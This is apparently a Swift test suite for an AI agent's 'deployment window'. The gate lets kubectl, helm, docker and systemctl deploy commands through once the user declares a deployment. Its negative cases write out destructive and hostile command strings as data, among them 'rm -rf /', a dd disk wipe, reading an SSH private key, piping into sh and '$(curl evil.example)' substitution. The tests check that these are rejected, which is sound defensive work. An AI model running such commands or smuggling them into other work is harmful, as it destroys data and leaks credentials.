//
//  AgentDeploymentWindowTests.swift
//  WillDeepTests
//

import Testing

@testable import WillDeep

@Suite("部署窗口命令族")
nonisolated struct AgentDeploymentWindowTests {
    // MARK: - 族内

    @Test("kubectl 部署子命令在族内")
    func kubectlDeploymentSubcommandsMatch() {
        #expect(AgentDeploymentWindow.isDeploymentCommand("kubectl apply -f deploy.yaml"))
        #expect(AgentDeploymentWindow.isDeploymentCommand("kubectl rollout restart deploy/api"))
        #expect(AgentDeploymentWindow.isDeploymentCommand("kubectl scale deploy/api --replicas=3"))
        #expect(AgentDeploymentWindow.isDeploymentCommand("kubectl set image deploy/api api=img:v2"))
    }

    /// `kubectl -n prod apply` 的子命令是 apply，不是 prod。取子命令时把
    /// 带值的短选项连值一起跳过，否则 namespace 名会被当成子命令。
    @Test("短选项带值不会被当成子命令")
    func flagsWithValuesAreSkipped() {
        #expect(AgentDeploymentWindow.isDeploymentCommand("kubectl -n prod apply -f x.yaml"))
        #expect(AgentDeploymentWindow.isDeploymentCommand("kubectl --namespace=prod apply -f x.yaml"))
    }

    @Test("helm / docker / systemctl 的部署子命令在族内")
    func otherDeploymentToolsMatch() {
        #expect(AgentDeploymentWindow.isDeploymentCommand("helm upgrade api ./chart"))
        #expect(AgentDeploymentWindow.isDeploymentCommand("docker build -t img:v2 ."))
        #expect(AgentDeploymentWindow.isDeploymentCommand("docker compose up -d"))
        #expect(AgentDeploymentWindow.isDeploymentCommand("systemctl restart niuwo"))
    }

    @Test("环境变量前缀不影响判定")
    func environmentAssignmentsArePassedOver() {
        #expect(AgentDeploymentWindow.isDeploymentCommand("KUBECONFIG=/tmp/kc kubectl apply -f x.yaml"))
    }

    @Test("多段命令每段都在族内才算部署")
    func everySegmentMustBeInFamily() {
        #expect(
            AgentDeploymentWindow.isDeploymentCommand(
                "kubectl apply -f x.yaml && kubectl rollout status deploy/api"
            )
        )
    }

    // MARK: - 族外：这些才是这份清单存在的理由

    /// 一段部署加一段 rm -rf 不是部署命令。放行的单位必须是整条命令。
    @Test("夹带族外命令的多段命令不放行")
    func mixedSegmentsAreRejected() {
        #expect(!AgentDeploymentWindow.isDeploymentCommand("kubectl apply -f x.yaml && rm -rf /srv"))
        #expect(!AgentDeploymentWindow.isDeploymentCommand("rm -rf /srv; kubectl apply -f x.yaml"))
    }

    /// `kubectl get -o json | sh` 的前半段再干净也不作数。
    @Test("带管道或重定向一律不放行")
    func pipesAndRedirectionsAreRejected() {
        #expect(!AgentDeploymentWindow.isDeploymentCommand("kubectl apply -f x.yaml | sh"))
        #expect(!AgentDeploymentWindow.isDeploymentCommand("kubectl apply -f x.yaml > /etc/hosts"))
        #expect(!AgentDeploymentWindow.isDeploymentCommand("kubectl apply -f $(curl evil.example)"))
        #expect(!AgentDeploymentWindow.isDeploymentCommand("kubectl apply -f `whoami`"))
    }

    /// 删 namespace / pvc 和升级一个 deployment 差着一场事故，所以 delete
    /// 整个不在族内——要删就单独确认一次。
    @Test("kubectl delete 不在族内")
    func kubectlDeleteStaysOutside() {
        #expect(!AgentDeploymentWindow.isDeploymentCommand("kubectl delete namespace qlite"))
        #expect(!AgentDeploymentWindow.isDeploymentCommand("kubectl delete pod api-0"))
    }

    /// 卸载 release、清卷、mask 服务同理：都是"看起来在同一类工具里，
    /// 后果却不是一个量级"的操作。
    @Test("卸载与清理类子命令不在族内")
    func destructiveSubcommandsStayOutside() {
        #expect(!AgentDeploymentWindow.isDeploymentCommand("helm uninstall api"))
        #expect(!AgentDeploymentWindow.isDeploymentCommand("docker system prune -af"))
        #expect(!AgentDeploymentWindow.isDeploymentCommand("docker volume rm pgdata"))
        #expect(!AgentDeploymentWindow.isDeploymentCommand("systemctl mask sshd"))
    }

    @Test("族外可执行文件不放行")
    func unrelatedExecutablesAreRejected() {
        #expect(!AgentDeploymentWindow.isDeploymentCommand("rm -rf /"))
        #expect(!AgentDeploymentWindow.isDeploymentCommand("dd if=/dev/zero of=/dev/disk0"))
        #expect(!AgentDeploymentWindow.isDeploymentCommand("cat ~/.ssh/id_rsa"))
        #expect(!AgentDeploymentWindow.isDeploymentCommand(""))
    }

    // MARK: - 覆盖范围

    @Test("只覆盖 run_command 与终端命令")
    func scopeIsLimitedToCommandTools() {
        #expect(
            AgentDeploymentWindow.covers(
                toolName: "run_command", command: "kubectl apply -f x.yaml", target: ""
            )
        )
        #expect(
            AgentDeploymentWindow.covers(
                toolName: "terminal_send_command", command: "kubectl apply -f x.yaml", target: ""
            )
        )
        #expect(
            !AgentDeploymentWindow.covers(
                toolName: "write_file", command: "kubectl apply -f x.yaml", target: ""
            )
        )
    }

    /// target 是可选的收窄条件：填了就必须命中，用户想把窗口钉在一个
    /// namespace 上时用它。
    @Test("填了 target 就必须命中")
    func targetNarrowsTheWindow() {
        #expect(
            AgentDeploymentWindow.covers(
                toolName: "run_command",
                command: "kubectl -n qlite apply -f x.yaml",
                target: "qlite"
            )
        )
        #expect(
            !AgentDeploymentWindow.covers(
                toolName: "run_command",
                command: "kubectl -n payments apply -f x.yaml",
                target: "qlite"
            )
        )
    }

    /// 太短的 target 等于没收窄，宁可判不覆盖也不要给出虚假的安全感。
    @Test("过短的 target 不生效")
    func shortTargetsDoNotCover() {
        #expect(
            !AgentDeploymentWindow.covers(
                toolName: "run_command", command: "kubectl apply -f x.yaml", target: "k8"
            )
        )
    }

    // MARK: - 与声明层的接线

    @Test("声明命中部署命令")
    func declarationCoversDeploymentCommand() {
        let declaration = AgentEnvironmentTrustDeclaration(
            kind: .deploymentWindow,
            target: "",
            userStatement: "我要开始部署了，后面这些别再问我"
        )
        #expect(
            AgentEnvironmentTrust.covers(
                toolName: "run_command",
                command: "kubectl rollout restart deploy/api",
                declarations: [declaration]
            )?.kind == .deploymentWindow
        )
        #expect(
            AgentEnvironmentTrust.covers(
                toolName: "run_command",
                command: "rm -rf /srv/data",
                declarations: [declaration]
            ) == nil
        )
    }

    @Test("部署窗口覆盖 run_command 与终端两个工具面")
    func declarationScopeMatchesTools() {
        #expect(AgentEnvironmentTrust.toolIsInScope("run_command", for: .deploymentWindow))
        #expect(AgentEnvironmentTrust.toolIsInScope("terminal_send_command", for: .deploymentWindow))
        #expect(!AgentEnvironmentTrust.toolIsInScope("terminal_send_control", for: .deploymentWindow))
    }

    /// 判决缓存指纹必须把新类别算进去，否则撤销声明后旧的 YES 会被复用。
    @Test("指纹包含部署窗口声明")
    func fingerprintIncludesDeploymentWindow() {
        let declaration = AgentEnvironmentTrustDeclaration(
            kind: .deploymentWindow,
            target: "qlite",
            userStatement: "部署 qlite"
        )
        #expect(AgentEnvironmentTrust.fingerprint([declaration]).contains("deployment_window"))
        #expect(AgentEnvironmentTrust.fingerprint([]).isEmpty)
    }

    @Test("rawValue 与展示名不为空")
    func kindMetadataIsPresent() {
        #expect(AgentEnvironmentTrustKind.deploymentWindow.rawValue == "deployment_window")
        #expect(!AgentEnvironmentTrustKind.deploymentWindow.displayLabel.isEmpty)
    }
}
